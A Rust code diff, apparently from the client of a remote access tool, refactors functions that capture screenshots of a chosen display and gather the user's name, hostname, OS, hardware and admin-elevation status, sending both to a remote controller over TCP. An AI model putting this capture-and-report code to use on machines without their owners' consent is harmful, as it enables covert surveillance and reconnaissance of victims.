@@ -16,11 +16,10 @@ use std::ptr;
 
 use crate::service::install::is_elevated;
 
-use common::buffers::write_bytes;
+use common::buffers::write_buffer;
+use common::commands::{ReceiveClient, Command};
 
 pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
-    println!("taking the mf screenshot");
-        
     let screens = Screen::all().unwrap();
 
     let screen = screens[display as usize];
@@ -30,21 +29,14 @@ pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
     let mut bytes: Vec<u8> = Vec::new();
 
     image
-        .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Png)
+        .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
         .expect("Couldn't write image to bytes.");
 
-    let header = "screenshot||".to_string();
-
-    write_bytes(write_stream, &[header.as_bytes(), &bytes].concat());
+    write_buffer(write_stream, Command::ScreenshotResult(bytes));
 }
 
 pub fn client_info(write_stream: &mut TcpStream) {
     let mut s = System::new_all();
-
-    let hostname = System::host_name().unwrap().to_string();
-    let username = std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string());
-    let os = format!("{} {}", System::name().unwrap(), System::os_version().unwrap());
-    let ram: String = convert_bytes(s.total_memory() as f64);
 
     let mut storage = Vec::new();
 
@@ -53,12 +45,6 @@ pub fn client_info(write_stream: &mut TcpStream) {
         storage.push(format!("{} {} {}", disk.name().to_string_lossy(), convert_bytes(disk.available_space() as f64), disk.kind()));
     }
     
-
-    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
-    s.refresh_cpu();
-
-    let cpu = s.cpus()[0].brand().to_string();
-
     let mut gpus = Vec::new();
 
     unsafe {
@@ -89,6 +75,7 @@ pub fn client_info(write_stream: &mut TcpStream) {
     }
 
     let mut display_count = 0;
+
     unsafe {
         EnumDisplayMonitors(
             ptr::null_mut(),
@@ -98,10 +85,22 @@ pub fn client_info(write_stream: &mut TcpStream) {
         );
     }
 
-    let is_elevated = is_elevated();
+    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
+    s.refresh_cpu();
 
-    let response = format!("receive::{}::{}::{}::{}::{}::{}::{}::{}::{}", username, hostname, os, ram, cpu, gpus.join(","), storage.join(","), display_count, is_elevated);
-    write_bytes(write_stream, response.as_bytes());
+    let client_data: ReceiveClient = ReceiveClient {
+        username: std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string()),
+        hostname: System::host_name().unwrap().to_string(),
+        os: format!("{} {}", System::name().unwrap(), System::os_version().unwrap()),
+        ram: convert_bytes(s.total_memory() as f64),
+        cpu: s.cpus()[0].brand().to_string().clone(),
+        gpus: gpus.clone(),
+        storage: storage.clone(),
+        displays: display_count,
+        is_elevated: is_elevated(),
+    };
+
+    write_buffer(write_stream, Command::Client(client_data));
 }
 
 const SUFFIX: [& str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
